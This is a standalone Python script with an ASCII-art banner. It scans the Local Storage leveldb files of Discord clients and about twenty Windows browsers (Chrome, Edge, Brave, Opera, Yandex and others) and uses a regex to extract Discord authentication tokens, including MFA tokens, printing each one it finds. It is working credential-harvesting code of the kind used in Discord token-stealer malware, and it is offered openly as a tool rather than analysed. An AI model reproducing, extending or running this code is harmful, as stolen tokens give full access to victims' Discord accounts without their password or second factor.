print("\033[91m")
print(r'''
  ______   __                        __        __  __                          
 /      \ |  \                      |  \      |  \|  \                         
|  $$$$$$\| $$____    ______    ____| $$  ____| $$| $$       ______    ______  
| $$   \$$| $$    \  /      \  /      $$ /      $$| $$      /      \  /      \ 
| $$      | $$$$$$$\|  $$$$$$\|  $$$$$$$|  $$$$$$$| $$     |  $$$$$$\|  $$$$$$\
| $$   __ | $$  | $$| $$    $$| $$  | $$| $$  | $$| $$     | $$  | $$| $$  | $$
| $$__/  \| $$  | $$| $$$$$$$$| $$__| $$| $$__| $$| $$_____| $$__/ $$| $$__| $$
 \$$    $$| $$  | $$ \$$     \ \$$    $$ \$$    $$| $$     \\$$    $$ \$$    $$
  \$$$$$$  \$$   \$$  \$$$$$$$  \$$$$$$$  \$$$$$$$ \$$$$$$$$ \$$$$$$  _\$$$$$$$
                                                                     |  \__| $$
                                                                      \$$    $$
                                                                       \$$$$$$ 
''')
print("\033[0m")

import os
import re

def fetch():
    regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"

    paths = {
        'Discord': os.path.join(os.getenv("APPDATA"), 'discord', 'Local Storage', 'leveldb'),
        'Discord Canary': os.path.join(os.getenv("APPDATA"), 'discordcanary', 'Local Storage', 'leveldb'),
        'Lightcord': os.path.join(os.getenv("APPDATA"), 'Lightcord', 'Local Storage', 'leveldb'),
        'Discord PTB': os.path.join(os.getenv("APPDATA"), 'discordptb', 'Local Storage', 'leveldb'),
        'Opera': os.path.join(os.getenv("APPDATA"), 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
        'Opera GX': os.path.join(os.getenv("APPDATA"), 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
        'Amigo': os.path.join(os.getenv("LOCALAPPDATA"), 'Amigo', 'User Data', 'Local Storage', 'leveldb'),
        'Torch': os.path.join(os.getenv("LOCALAPPDATA"), 'Torch', 'User Data', 'Local Storage', 'leveldb'),
        'Kometa': os.path.join(os.getenv("LOCALAPPDATA"), 'Kometa', 'User Data', 'Local Storage', 'leveldb'),
        'Orbitum': os.path.join(os.getenv("LOCALAPPDATA"), 'Orbitum', 'User Data', 'Local Storage', 'leveldb'),
        'CentBrowser': os.path.join(os.getenv("LOCALAPPDATA"), 'CentBrowser', 'User Data', 'Local Storage', 'leveldb'),
        '7Star': os.path.join(os.getenv("LOCALAPPDATA"), '7Star', '7Star', 'User Data', 'Local Storage', 'leveldb'),
        'Sputnik': os.path.join(os.getenv("LOCALAPPDATA"), 'Sputnik', 'Sputnik', 'User Data', 'Local Storage', 'leveldb'),
        'Vivaldi': os.path.join(os.getenv("LOCALAPPDATA"), 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Chrome SxS': os.path.join(os.getenv("LOCALAPPDATA"), 'Google', 'Chrome SxS', 'User Data', 'Local Storage', 'leveldb'),
        'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Epic Privacy Browser': os.path.join(os.getenv("LOCALAPPDATA"), 'Epic Privacy Browser', 'User Data', 'Local Storage', 'leveldb'),
        'Microsoft Edge': os.path.join(os.getenv("LOCALAPPDATA"), 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Uran': os.path.join(os.getenv("LOCALAPPDATA"), 'uCozMedia', 'Uran', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Yandex': os.path.join(os.getenv("LOCALAPPDATA"), 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Brave': os.path.join(os.getenv("LOCALAPPDATA"), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Iridium': os.path.join(os.getenv("LOCALAPPDATA"), 'Iridium', 'User Data', 'Default', 'Local Storage', 'leveldb'),
    }

    for name, path in paths.items():
        if not os.path.exists(path):
            continue

        print(f"Checking {name}...")

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            try:
                with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                    for line in file:
                        tokens = re.findall(regex, line)
                        for token in tokens:
                            print(f"Found token in {name}: {token}")
            except Exception as e:
                print(f"Error reading from {name}: {e}")

fetch()

input("Press enter to exit...")

